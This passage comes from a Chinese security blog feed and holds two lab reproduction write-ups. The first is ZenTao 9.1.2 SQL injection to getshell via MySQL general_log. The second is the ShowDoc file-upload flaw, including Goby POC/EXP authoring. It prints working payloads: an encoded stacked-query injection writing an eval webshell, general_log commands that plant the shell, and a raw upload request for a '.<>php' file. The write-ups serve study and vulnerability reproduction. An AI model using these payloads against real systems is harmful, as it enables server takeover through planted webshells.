vulfocus/zentaopms_9.1.2_sql</code></li><li>启动：<code>sudo docker run -dt --name zentao -p 8080:80 vulfocus/zentaopms_9.1.2_sql</code></li><li>访问：<code>IP+8080+/zentaopms/www/index.php</code></li><li>后台管理员账户：<code>admin/zxc@123</code></li></ol><h3 id="后文会用到的命令"><a href="#后文会用到的命令" class="headerlink" title="后文会用到的命令"></a>后文会用到的命令</h3><ol><li>进行docker内：<code>sudo docker exec -it xxxx /bin/bash</code></li><li>进入mysql：<code>mysql -u root -p</code>  。账户密码： <code>root/pass</code>,账户密码存于<code>/www/zentaopms/config/my.php</code></li><li>mysql命令：<ol><li>查看安全：<code>show variables like &#39;%secure%&#39;;</code></li><li>查看日志：<code>show variables like &#39;general_log%&#39;;</code></li><li>设置日志路径：<code>set global general_log_file=&#39;/var/lib/mysql/ac2ecb1e75dc.log&#39;;</code></li><li>设置日志开启：<code>set global general_log=&#39;on&#39;;</code></li></ol></li></ol><blockquote><p>trick: 由于payload要频繁base64编码，burpsuite中的trick：<code>Ctrl+B</code>→Base64编码，<code>Ctrl+Shift+B</code>→Base64解码</p></blockquote><h2 id="SELECT…INTO-OUTFILE方式失败"><a href="#SELECT…INTO-OUTFILE方式失败" class="headerlink" title="SELECT…INTO OUTFILE方式失败"></a>SELECT…INTO OUTFILE方式失败</h2><p>最早找到的文章<a href="https://www.freebuf.com/vuls/246678.html">《禅道免登陆SQL注入漏洞复现》</a>就是通过SELECT…INTO OUTFILE方式写入，但是发现怎么写入都不成功</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">payload--&gt;select <span class="hljs-string">&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;</span> into outfile <span class="hljs-string">&#x27;/www/zentaopms/www/1.php&#x27;</span><br>hex--&gt;<span class="hljs-number">0x73656c65637420273c3f70687020406576616c28245f504f53545b315d293f3e2720696e746f206f757466696c6520272f7777772f7a656e74616f706d732f7777772f312e70687027</span><br>params--&gt;&#123;<span class="hljs-string">&quot;orderBy&quot;</span>:<span class="hljs-string">&quot;order limit 1;SET @SQL=0x73656c65637420273c3f70687020406576616c28245f504f53545b315d293f3e2720696e746f206f757466696c6520272f7777772f7a656e74616f706d732f7777772f312e70687027;PREPARE pord FROM @SQL;EXECUTE pord;-- -&quot;</span>,<span class="hljs-string">&quot;num&quot;</span>:<span class="hljs-string">&quot;1,1&quot;</span>,<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;openedbyme&quot;</span>&#125;<br>base64--&gt;eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2YzY1NjM3NDIwMjczYzNmNzA2ODcwMjA0MDY1NzY2MTZjMjgyNDVmNTA0ZjUzNTQ1YjMxNWQyOTNmM2UyNzIwNjk2ZTc0NmYyMDZmNzU3NDY2Njk2YzY1MjAyNzJmNzc3Nzc3MmY3YTY1NmU3NDYxNmY3MDZkNzMyZjc3Nzc3NzJmMzEyZTcwNjg3MDI3O1BSRVBBUkUgcG9yZCBGUk9NIEBTUUw7RVhFQ1VURSBwb3JkOy0tIC0iLCJudW0iOiIxLDEiLCJ0eXBlIjoib3BlbmVkYnltZSJ9<br></code></pre></td></tr></table></figure><h3 id="失败的原因"><a href="#失败的原因" class="headerlink" title="失败的原因"></a>失败的原因</h3><p><code>show variables like &#39;%secure%&#39;;</code>其中<code>secure_file_priv</code>会限制数据的导入导出操作。</p><p>（1）当<code>secure_file_priv</code>为空，就可以任意读取磁盘的目录。</p><p>（2）当<code>secure_file_priv</code>为path，就可以读取对应目录以及其子目录的文件。</p><p>（3）当<code>secure_file_priv</code>为null，不能加载文件。</p><p>故反馈到靶机上，查看下图，文件只能写入到<code>/var/lib/mysql-files</code>目录下。如将shell的写入路径改为<code>/var/lib/mysql-files/1.php</code>即可以写入shell，但是这种写入也只是鸡肋，无法利用</p><p>且<code>secure-file-priv</code>属于Server System Variables，无法通过SQL语句更改，只能通过更改系统配置文件的方式。故通过SELECT … INTO OUTFILE语句写入shell的方式在此靶机中行不通</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%202.png" alt="Untitled"></p><blockquote><p>trick：vulfocus的靶机提供了3306端口的对外映射，故可以直接链接</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%203.png" alt="Untitled"></p><h2 id="sleep-验证漏洞存在"><a href="#sleep-验证漏洞存在" class="headerlink" title="sleep()验证漏洞存在"></a>sleep()验证漏洞存在</h2><blockquote><p>既然按照上述文章一把梭的方式失败，就只能最简单的<code>sleep()</code>开始验证漏洞存在，给自己点正面反馈</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%204.png" alt="Untitled"></p><h2 id="报错尝试"><a href="#报错尝试" class="headerlink" title="报错尝试"></a>报错尝试</h2><blockquote><p>此处也是给自己的一个正反馈：延时盲注可行，写shell文件不行，于是尝试报错注入，看能否再给自己一个正反馈</p></blockquote><p>参考：L3m0n师傅<a href="https://zhuanlan.zhihu.com/p/34275981">《从SQL注入到Getshell：记一次禅道系统的渗透》</a> </p><p>构造:<code>&#123;&quot;orderBy&quot;:&quot;order limit 1&#39;&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;&#125;</code> 其中1后面有个单引号，进而构成报错注入。很庆幸看到了报错信息，但遗憾无法根据报错进行注入。</p><p>关于为什么此处不用堆叠注入，L3m0n文中也提及：因为“limit后的注入点，因为使用多语句的话，报错效果不明显，所以就直接在limit后面进行注入”，而“limit的注入和mysql版本还有一些关系，目前网上的payload仅限于低版本才可报错注入出数据，很不幸运的是，目标使用的是高版本mysql”</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%205.png" alt="Untitled%205.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%206.png" alt="Untitled"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%207.png" alt="Untitled"></p><h2 id="general-log方式成功"><a href="#general-log方式成功" class="headerlink" title="general_log方式成功"></a>general_log方式成功</h2><p>general_log写入四部曲：</p><ol><li>开启日志：<code>set global general_log=&#39;on&#39;;</code> </li><li>更改日志路径：<code>set global general_log_file=&#39;/www/zentaopms/module/misc/ext/model/foo.php&#39;;</code> </li><li>注入shell语句：<code>select &#39;&lt;?php @eval($_POST[1])?&gt;&#39;;</code> </li><li>关闭日志:<code>set global general_log=&#39;off&#39;;</code></li></ol><p>注：我第四步选择关闭日志，因为实在不想所有的SQL语句都写入文件，进而导致shell文件过于冗杂</p><h3 id="坑一：mysql写入文件的权限问题"><a href="#坑一：mysql写入文件的权限问题" class="headerlink" title="坑一：mysql写入文件的权限问题"></a>坑一：mysql写入文件的权限问题</h3><p>我尝试随便写入文件到Web目录下，如<code>set global general_log_file=&#39;/www/zentaopms/www/test.php&#39;</code> ，但遗憾失败了，卡在了权限。</p><p>原因：执行SQL语句写入文件的是mysql用户，但是运行Web服务的是www-data用户</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%208.png" alt="Untitled%208.png"></p><h3 id="坑一解决方案"><a href="#坑一解决方案" class="headerlink" title="坑一解决方案"></a>坑一解决方案</h3><p>思路：找到一个mysql可以写入的,且www-data用户可以访问的php文件</p><p>方法：<code>find /www/zentaopms/ -perm 777 -type f</code>   </p><p>发现web目录下有这些文件可以写，初步排查一波，觉得<code>hello.test.php</code>可用</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%209.png" alt="Untitled"></p><h3 id="坑二：php标签闭合"><a href="#坑二：php标签闭合" class="headerlink" title="坑二：php标签闭合"></a>坑二：php标签闭合</h3><p><code>hello.test.php</code> 确实可以写入，web也确实可以访问，但是访问出错</p><p>我直接将写入的文件复制到本地环境访问，发现原因在于开启日志会写入一些信息，而这些信息不符合php语法故报错，即使是闭合了php标签。</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2010.png" alt="Untitled%2010.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2011.png" alt="Untitled"></p><h3 id="坑二解决方案"><a href="#坑二解决方案" class="headerlink" title="坑二解决方案"></a>坑二解决方案</h3><p>继续再从上述权限为777类型的文件中找其他的闭合了标签的php文件，然后发现foo文件吻合。</p><p>故我的攻击路径采用的是<code>/www/zentaopms/module/misc/ext/model/foo.php</code> ，当然也有其他文件可以，但未每个尝试</p><blockquote><p>采用：<code>inurl:ext/model/foo.php</code> 语法进行搜索，疑似就是禅道默认都会有这个foo.php文件？未测试</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2012.png" alt="Untitled%2012.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2013.png" alt="Untitled%2013.png"></p><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="为什么要加refer字段"><a href="#为什么要加refer字段" class="headerlink" title="为什么要加refer字段"></a>为什么要加refer字段</h2><p>参考L3m0n师傅的文章，在9.1.2也就是靶场环境的/www/zentaopms/module/block/control.php文件中，在“*__construct中，$this-&gt;selfCall是在验证referer的值，如果为真的话则后面的if将不会进入die语句里面*”</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2014.png" alt="Untitled"></p><h2 id="为什么用预处理"><a href="#为什么用预处理" class="headerlink" title="为什么用预处理"></a>为什么用预处理</h2><p>堆叠普通SQL语句，如<code>&#123;&quot;orderBy&quot;:&quot;order limit 1;select sleep(5)-- -&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;&#125;</code>还是可以的，但是使用general_log方式，SQL语句中会用到下划线<code>_</code>，而<code>_</code>被过滤会造成SQL语句执行出现问题。</p><p>还是参考L3m0n师傅的文章，在9.1.2也就是靶场环境的/www/zentaopms/lib/base/dao/dao.class.php的orderby函数中可以看到，将“<em>下划线给过滤掉了，那这种在多语句下，可以利用mysql的预查询来绕过</em>”</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2015.png" alt="Untitled"></p><h2 id="为什么general-log值可更改，secure-file-priv不行"><a href="#为什么general-log值可更改，secure-file-priv不行" class="headerlink" title="为什么general_log值可更改，secure_file_priv不行"></a>为什么general_log值可更改，secure_file_priv不行</h2><p>还是查看官方文档，<code>general_log</code>属于<a href="https://dev.mysql.com/doc/refman/5.7/en/dynamic-system-variables.html">Dynamic System Variables</a>，可以通过set来动态更改。而<code>secure_file_priv</code> 是<a href="https://dev.mysql.com/doc/refman/5.7/en/security-options.html">非动态的系统变量</a>，故不可以更改</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2016.png" alt="Untitled"></p><h2 id="黑盒情况下如何判断secure-file-priv变量的值"><a href="#黑盒情况下如何判断secure-file-priv变量的值" class="headerlink" title="黑盒情况下如何判断secure_file_priv变量的值"></a>黑盒情况下如何判断secure_file_priv变量的值</h2><h3 id="根据系统信息"><a href="#根据系统信息" class="headerlink" title="根据系统信息"></a>根据系统信息</h3><blockquote><p>很多人搜到上面的内容就点到为止了，但远不于此</p></blockquote><p>查看了下<a href="https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv">官方文档关于secure-file-priv的介绍</a> ：</p><p><code>secure-file-priv</code>的默认值因平台而异，取决于对应的CMake文件，默认如下图：</p><p>从图中可以看出windows取决于mysql版本，版本在5.7.16下可利用，而DEB, RPM, SLES, SVR4基本涵盖了绝大部分的linux，默认路径只在/var/lib/mysql-files，故linux下大概率不行</p><p>反馈到靶机环境上：网上采用load_file方式注入shell复现禅道的都在windows下故可行，而vulfucus中则在ubuntu下搭建环境，故无法利用</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2017.png" alt="Untitled"></p><blockquote><p>注：文档中也提及mysql服务在启动的时候会根据<code>System variables</code> 设置相关配置 ，而由于<code>secure-file-priv</code> 是写在配置文件中的，故即使更改系统配置文件，也需要重启mysql服务才能使配置生效</p></blockquote><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p><code>select @@secure_file_priv;</code> 或 <code>select @@global.secure_file_priv;</code></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2018.png" alt="Untitled"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2019.png" alt="Untitled"></p><h2 id="查看mysql日志debug"><a href="#查看mysql日志debug" class="headerlink" title="查看mysql日志debug"></a>查看mysql日志debug</h2><p>查看mysql日志文件并且时刻刷新进而实现监控的效果： <code>tail -f /var/lib/mysql/ac2ecb1e75dc.log</code>  。<a href="https://www.runoob.com/linux/linux-comm-tail.html">Linux tail 命令</a></p><p>我通过debug找到坑点举例：</p><ol><li>尝试更改日志路径，但是总更改不了：<code>set global general_log_file=&#39;tmp/general.lg&#39;</code> </li><li>通过实时监控日志文件发现命令确实执行，但是就是执行不成功</li><li>将系统执行的命令复制到mysql中执行，发现文件路径少了一个“<code>/</code>”（mysql命令相对路径在/var/lib/mysql下，而该目录下tmp子目录不存在。mysql遇到文件不存在会创建，但遇到路径上的目录不存在则会出错）</li><li>更改后，即可成功<code>set global general_log_file=&#39;/tmp/general.lg&#39;</code></li></ol><p>注：关于为什么在路径中少了个<code>/</code> ，论网上教程的七宗罪</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2020.png" alt="Untitled%2020.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2021.png" alt="Untitled"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2022.png" alt="Untitled%2022.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2023.png" alt="Untitled"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>感谢<a href="https://ovi3.github.io/index.html">ovi3师傅</a>的指导</li><li>如何发现secure_file_priv在不同平台默认值？<ol><li>缘起：如果在黑盒情况下如何判断能否用load_file？</li><li>想法：我想试着通过盲注注出secure_file_priv变量的值，进而判断能否用load_file，找着找着然后就去看官方文档，进而发现了这个trick</li><li>反思：我们习惯从网上获取到二手的关于secure_file_priv变量设置为null、empty值对应的介绍，然后点到为止</li><li>教训：①多自我提问②多尝试获取一手信息，也许意外之喜</li></ol></li><li>沉下心<ol><li>发现 <code>general_log_file=&#39;tmp/general.lg&#39;</code> 报错之后，就只是简单的以为路径写错了罢了。经过ovi3师傅提醒，发现了错因的根本在于相对路径与绝对路径的区别</li><li>复现报错注入的时候测试payload是“<code>PROCEDURE ANALYSE(polygon(id),1)#</code>”，但实则我的环境中并没有这个id字段注入也不会得到想要的id内容，而我选择盲注复制L3m0n的payload以及其结论而快速跳过，而忽略了其用的是limit后的报错注入而不是之前的堆叠</li></ol></li><li>缺点<ol><li>代码审计篇幅没有展开，也没有深入研究。</li><li>对其他可写日志的php文件没有深入研究，并没有真正探索出共性，如foo.php文件在每个禅道版本是否都存在没有核实。</li></ol></li><li>自省：如果我没有靶机环境，我如何getshell?如何找到foo.php?如果实战遇到，我是否会放弃？</li></ol>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>SQL注入</tag>
      
      <tag>mysql写日志</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次不停自我追问式的学习</title>
    <link href="/2021/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最初只是简单的搭建环境，拿着公开的POC复现漏洞。然后想着学学Goby如何编写POC&amp;EXP，先拿GUI的形式编写，但是逐渐发现很多想法都满足不了，于是尝试Go语言编写。但也不满足于此，想去探究漏洞成因于是选择代码审计，最后对漏洞成因进行跟踪溯源，得出一个较为满意的结论！</p><h1 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1. 准备工作"></a>1. 准备工作</h1><h2 id="1-1-漏洞速览"><a href="#1-1-漏洞速览" class="headerlink" title="1.1 漏洞速览"></a>1.1 漏洞速览</h2><p>漏洞描述：Showdoc存在文件上传漏洞，攻击者可以利用漏洞获取服务器权限。</p><p>漏洞影响：ShowDoc &lt; V2.8.3</p><p>漏洞参考：<a href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-26585">https://www.cnvd.org.cn/flaw/show/CNVD-2020-26585</a></p><h2 id="1-2-环境搭建"><a href="#1-2-环境搭建" class="headerlink" title="1.2 环境搭建"></a>1.2 环境搭建</h2><p>系统：Windows10</p><p>工具：PHPStudy2016，VScode，Goby，Burp</p><p>环境：showdoc-V2.6.7  <a href="https://github.com/star7th/showdoc">https://github.com/star7th/showdoc</a></p><h2 id="1-3-POC"><a href="#1-3-POC" class="headerlink" title="1.3 POC"></a>1.3 POC</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jsx">POST /index.php?s=<span class="hljs-regexp">/home/</span>page/uploadImg HTTP/<span class="hljs-number">1.1</span><br><span class="hljs-attr">Host</span>: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">81</span><br>Content-Type: multipart/form-data; boundary=---------------------------<span class="hljs-number">346031065719027724703329952952</span><br>Content-Length: <span class="hljs-number">252</span><br><span class="hljs-attr">Connection</span>: close<br><br>-----------------------------<span class="hljs-number">346031065719027724703329952952</span><br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;editormd-image-file&quot;</span>; filename=<span class="hljs-string">&quot;1.&lt;&gt;php&quot;</span><br>Content-Type: text/plain<br><br>&lt;?php phpinfo();?&gt;<br>-----------------------------<span class="hljs-number">346031065719027724703329952952</span>--<br></code></pre></td></tr></table></figure><h2 id="1-4-复现"><a href="#1-4-复现" class="headerlink" title="1.4 复现"></a>1.4 复现</h2><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled.png"></p><h1 id="2-利用Goby的GUI编写POC-amp-EXP"><a href="#2-利用Goby的GUI编写POC-amp-EXP" class="headerlink" title="2. 利用Goby的GUI编写POC&amp;EXP"></a>2. 利用Goby的GUI编写POC&amp;EXP</h1><h2 id="2-1-编写POC"><a href="#2-1-编写POC" class="headerlink" title="2.1 编写POC"></a>2.1 编写POC</h2><h3 id="2-1-1-填入基本内容"><a href="#2-1-1-填入基本内容" class="headerlink" title="2.1.1 填入基本内容"></a>2.1.1 填入基本内容</h3><p>可以手动输入，但是由于该漏洞有CNVD编号，于是考虑从命令行导入</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">//在goby的golib目录下的goby-cmd文件，也可以-h解锁更多操作</span><br>goby-cmd -mode genpoc -CNVDID CNVD-<span class="hljs-number">2020</span>-<span class="hljs-number">26585</span> -exportFile exploits\user\CNVD-<span class="hljs-keyword">export</span>.go<br><span class="hljs-comment">//导出文件在goby的\golib\exploits\user目录下</span><br></code></pre></td></tr></table></figure><p>已知BUG：</p><ol><li>通过命令行导出的文件需要手动加上指纹：<code>&quot;GobyQuery&quot;: &quot;app=\&quot;showDoc\&quot;&quot;</code> ，才可以导入进Goby，不然导入不进去，会报错（在log中可以看到报错信息）</li><li>通过命令行导出的文件导入POC时，测试界面会出现白屏bug，因为ScanSteps中缺少<code>&quot;SetVariable&quot;: []</code> 字段，添加即可。</li></ol><blockquote><p>不想拘泥于手动，虽然导入遇到了不少的麻烦，但是总归是需要尝试的，后续Goby团队也会改进的。</p></blockquote><h3 id="2-2-2-发出请求"><a href="#2-2-2-发出请求" class="headerlink" title="2.2.2 发出请求"></a>2.2.2 发出请求</h3><p>简单的将POC内容复制粘贴进对应字段即可</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%201.png"></p><h3 id="2-2-3-验证响应"><a href="#2-2-3-验证响应" class="headerlink" title="2.2.3 验证响应"></a>2.2.3 验证响应</h3><p>参考Goby<a href="https://github.com/gobysec/Goby/wiki/PoC-writing-suggestions#%E5%87%86%E7%A1%AE%E6%80%A7">《PoC writing suggestions》中的准确性</a>：增加检测关键字、特殊符号、响应包中独一无二的特征，以提高其准确性。</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%202.png"></p><h3 id="2-2-4-编写POC的Tips"><a href="#2-2-4-编写POC的Tips" class="headerlink" title="2.2.4 编写POC的Tips"></a>2.2.4 编写POC的Tips</h3><ol><li>修改POC之后记得保存后，再进行单IP测试</li><li>由于Goby可能因为缓存等机制，导致修改POC并保存之后，即使发包也是未修改之前的包，需要返回漏洞管理界面再重新载入POC才行</li><li>由于上述载入载出步骤较为麻烦，我采用<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#%E6%BC%8F%E6%B4%9E%E6%A8%A1%E6%9D%BF%E8%84%9A%E6%89%8B%E6%9E%B6%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D">Goby脚手架</a>的方式，在VSCode修改代码的同时在CMD中测试： <code>goby-cmd -mode runpoc -operation scan -pocFile exploits\user\a.go -target 127.0.0.1</code></li><li>脚手架的方式不支持burp代理调试。如果需要对POC进行代理调试的话，推荐依然使用GUI的方法，详见<a href="https://mp.weixin.qq.com/s/IeftOSV29DbDgeClqXqnkg">《Json 编写 PoC&amp;EXP 遇到的那些坑》</a></li></ol><h2 id="2-2-编写EXP"><a href="#2-2-编写EXP" class="headerlink" title="2.2 编写EXP"></a>2.2 编写EXP</h2><p>总体思路同上POC的问题，只不过将上传的验证性文件切换为一句话、菜刀等类型木马文件，然后在浏览器中访问对应连接即可。</p><p>仔细查看<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#exp-%E7%BC%96%E5%86%99">官方文档的EXP部分</a> ，实际操作步骤如下：</p><ol><li>将 <code>HasExp</code> 字段设置为 true</li><li>在POC界面编写EXP后，在编辑器中将<code>ScanSteps</code>对应代码复制粘贴到<code>ExploitSteps</code> </li><li>上传文件内容更改为冰蝎马，上传一句话木马同理</li><li>直接将返回的链接扔到冰蝎里面连接即可。</li></ol><p>已知问题：</p><ol><li>GobyGUI目前暂不支持EXP用GUI编写，借用POC界面编写后，在编辑器中将<code>ScanSteps</code>对应代码复制粘贴到<code>ExploitSteps</code> </li><li>抓包问题：pcap模式扫描127.0.0.1无IP存活，但是socket模式下可以扫127.0.0.1</li></ol><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%203.png"></p><h2 id="2-3-进一步优化POC-amp-EXP"><a href="#2-3-进一步优化POC-amp-EXP" class="headerlink" title="2.3 进一步优化POC&amp;EXP"></a>2.3 进一步优化POC&amp;EXP</h2><h3 id="2-3-1-自动删除上传文件"><a href="#2-3-1-自动删除上传文件" class="headerlink" title="2.3.1 自动删除上传文件"></a>2.3.1 自动删除上传文件</h3><p>在公网测试的时候，发现一个很不好的现象：某站点上存在大量这类一句话木马。</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%204.png"></p><p>参考Goby<a href="https://github.com/gobysec/Goby/wiki/PoC-writing-suggestions#%E6%97%A0%E5%AE%B3%E6%80%A7">《PoC writing suggestions》的无害性</a>： 我们需要将上传的文件进行删除。虽然第一次第二次很麻烦，但是优秀是需要形成习惯的。</p><p>问题：</p><ol><li>如何删除上传文件？PHP中可以利用<code>unlink()</code>函数来删除文件</li><li>如何触发<code>unlink()</code>函数？连续发出两次请求。第一次请求用于上传文件，第二次请求用于触发<code>unlink()</code>函数删除文件</li><li>如何获取第二次请求的链接？第一次的返回包中有返回绝对路径，且Goby可以基于正则提取第一次请求的响应，并在第二次利用，详见Goby<a href="https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide#json-%E5%BD%95%E5%85%A5%E6%BC%8F%E6%B4%9E%E9%80%BB%E8%BE%91%E6%89%8B%E5%86%8C">《POC编写指南之JSON 录入漏洞逻辑手册》</a></li><li>如何编写正则？先百度正则语法，再用<a href="https://regex101.com/">regex101平台</a>进行测试</li><li>如何去掉链接<code>/\</code>这些符号？化繁为简，分析文件路径组成：Hostinfo+Public/Uploads+日期+随机文件名，后两个变量分两次正则提取，然后整体拼接即可</li></ol><p>问题解决了，步骤自然清晰：</p><ol><li>在上传的文件末尾增加<code>unlink()</code>函数</li><li>在第一次请求的正则部分增加自定义变量<code>date</code>和<code>file</code></li><li>在Goby中添加第二次请求的URL中使用这两个变量<code>/Public/Uploads/&#123;&#123;&#123;date&#125;&#125;&#125;/&#123;&#123;&#123;file&#125;&#125;&#125;</code></li><li>如果第二次响应为200即可算作成功</li></ol><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/Untitled%205.png"></p><p><img 